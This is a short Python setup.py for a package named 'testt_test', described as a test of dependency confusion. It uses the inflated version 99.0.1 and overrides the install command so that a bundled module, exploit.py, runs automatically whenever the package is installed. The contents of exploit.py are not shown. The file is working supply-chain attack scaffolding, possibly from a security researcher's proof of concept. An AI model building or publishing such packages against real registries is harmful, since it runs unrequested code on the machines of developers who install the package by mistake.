from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstallCommand(install):
    """Custom install command to run exploit.py during installation."""
    def run(self):
        install.run(self)
        # Execute exploit.py during installation
        try:
            import exploit
            exploit.run()
        except Exception as e:
            print(f"Error running exploit script: {e}")

setup(
    name="testt_test",
    version="99.0.1",
    description="package for testing dependency confusion",
    author="test",
    license="MIT",
    py_modules=["exploit"],
    cmdclass={
        'install': CustomInstallCommand,
    },
)